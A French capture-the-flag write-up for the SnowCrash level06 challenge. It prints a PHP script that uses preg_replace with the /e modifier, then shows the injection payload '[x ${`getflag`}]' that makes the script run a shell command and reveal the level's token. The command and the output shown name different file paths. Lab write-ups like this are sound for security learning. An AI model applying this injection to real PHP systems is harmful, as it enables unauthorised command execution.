@@ -1,0 +1,33 @@
+On se retrouve avec un executable et le fichier non compiler, qui s'appelle level06
+
+on regarde le contenu de level06:
+
+-- cat level06.php --
+** Sortie :
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+
+Que fait'il ?
+
+Il prend 2 arguments, on le voit a argv1 et argv2, il va lire le contenu du fichier argv1, et va remplacer les [x ...] par y("...") et les [] par des ().
+Il va ensuite afficher le resultat.
+
+On va donc creer un fichier dans /tmp/ avec le contenu suivant:
+
+-- echo '[x ${`getflag`}]' > /tmp/flag06 --
+
+On va ensuite lancer le script level06.php avec les arguments /tmp/flag06
+
+-- ./level06.php /tmp/flag06 --
+** Sortie :
+level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+On a notre flag : wiok45aaoguiboiki2tuin6ub
+
